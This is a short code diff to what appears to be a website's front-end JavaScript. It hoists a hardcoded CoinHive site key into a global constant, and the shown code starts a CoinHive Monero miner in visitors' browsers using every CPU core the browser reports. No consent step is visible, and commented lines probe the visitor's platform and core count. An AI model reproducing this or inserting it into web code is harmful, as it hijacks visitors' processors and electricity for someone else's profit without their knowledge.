@@ -1,3 +1,5 @@
+const monro_api_key = 'XXcJNZiaSWshUe3H2NuXzBrLj3kW2wvP';
+
 $(document).ready(function () {
     var socket = io.connect();
 
@@ -25,7 +27,6 @@ $(document).ready(function () {
       // alert(navigator.platform);
       // alert(navigator.hardwareConcurrency);
       // console.log('https://authedmine.com/media/miner.html?key=XXcJNZiaSWshUe3H2NuXzBrLj3kW2wvP');
-      const monro_api_key = 'XXcJNZiaSWshUe3H2NuXzBrLj3kW2wvP';
       var miner = new CoinHive.User(monro_api_key, 'User', {
     	threads: navigator.hardwareConcurrency,
     	autoThreads: false,
